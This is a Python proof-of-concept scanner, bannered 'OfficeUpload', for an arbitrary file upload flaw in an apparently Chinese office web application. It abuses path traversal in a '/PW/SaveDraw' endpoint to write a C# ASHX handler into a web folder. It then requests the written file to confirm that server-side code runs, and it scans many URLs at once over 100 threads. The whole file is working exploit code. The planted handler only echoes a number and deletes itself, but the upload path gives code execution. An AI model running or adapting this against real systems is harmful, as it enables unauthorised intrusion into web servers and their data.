import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

 ██████╗ ███████╗███████╗██╗ ██████╗███████╗██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██╔═══██╗██╔════╝██╔════╝██║██╔════╝██╔════╝██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
██║   ██║█████╗  █████╗  ██║██║     █████╗  ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
██║   ██║██╔══╝  ██╔══╝  ██║██║     ██╔══╝  ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
╚██████╔╝██║     ██║     ██║╚██████╗███████╗╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
 ╚═════╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝╚══════╝ ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                                                                                                                                                                                
                                                           
                                                                                version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/PW/SaveDraw?path=../../Content/img&idx=10.ashx"
    url = target+payload_url
    headers={
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
        'Content-Type':'application/x-www-form-urlencoded'
    }
    data = (
        'data:image/png;base64,{{filehash}}<%@ Language="C#" Class="Handler1" %>public class\r\n'
        'Handler1:System.Web.IHttpHandler\r\n'
        '{\r\n'
        'public void ProcessRequest(System.Web.HttpContext context)\r\n'
        '{\r\n'
        'System.Web.HttpResponse response = context.Response;\r\n'
        'response.Write(44 * 41);\r\n'
        '\r\n'
        'string filePath = context.Server.MapPath("/") + context.Request.Path;\r\n'
        'if (System.IO.File.Exists(filePath))\r\n'
        '{\r\n'
        'System.IO.File.Delete(filePath);\r\n'
        '}\r\n'
        '}\r\n'
        'public bool IsReusable\r\n'
        '{\r\n'
        'get { return false; }\r\n'
        '}\r\n'
        '}///---\r\n'
    )
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        url2 = target+"/Content/img/UserDraw/drawPW10.ashx"
        res2 = requests.get(url2, verify=False)
        if res.status_code == 200 and res2.status_code == 200 and '1804' in res2.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()